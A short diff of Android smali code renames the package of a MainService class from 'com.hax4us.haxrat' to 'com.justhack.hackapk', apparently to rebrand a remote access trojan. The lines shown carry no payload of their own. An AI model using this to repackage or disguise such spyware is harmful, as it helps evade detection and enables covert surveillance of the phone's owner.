@@ -59,7 +59,7 @@
     move-object v4, v0
 
     :try_start_0
-    iget-object v4, v4, Lcom/hax4us/haxrat/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;
+    iget-object v4, v4, Lcom/justhack/hackapk/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;
 
     const/4 v5, 0x0
 
@@ -85,7 +85,7 @@
     .line 102
     move-object v4, v2
 
-    invoke-static {v4}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V
+    invoke-static {v4}, Lcom/justhack/hackapk/MainService;->startService(Landroid/content/Context;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
